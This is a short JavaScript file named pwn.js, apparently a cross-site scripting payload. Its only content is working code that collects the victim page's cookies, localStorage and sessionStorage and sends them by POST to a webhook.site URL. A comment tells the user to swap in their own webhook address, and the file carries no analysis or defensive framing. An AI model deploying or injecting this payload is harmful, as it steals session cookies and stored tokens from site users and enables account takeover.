// pwn.js

// Define the URL of your exfiltration endpoint (replace with your Webhook.site URL)
const exfiltrationUrl = 'https://webhook.site/3943f855-c5fc-406e-b0fd-518d3c03cd0e';  // Your Webhook.site URL

// Exfiltrate cookies, localStorage, and sessionStorage
const data = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
};

// Send the exfiltrated data to the Webhook.site server
fetch(exfiltrationUrl, {
    method: 'POST',
    body: JSON.stringify(data),
    headers: {
        'Content-Type': 'application/json'
    }
}).then(response => {
    if (response.ok) {
        console.log('Data exfiltrated successfully');
    } else {
        console.log('Failed to exfiltrate data');
    }
}).catch(err => {
    console.error('Error during exfiltration:', err);
});
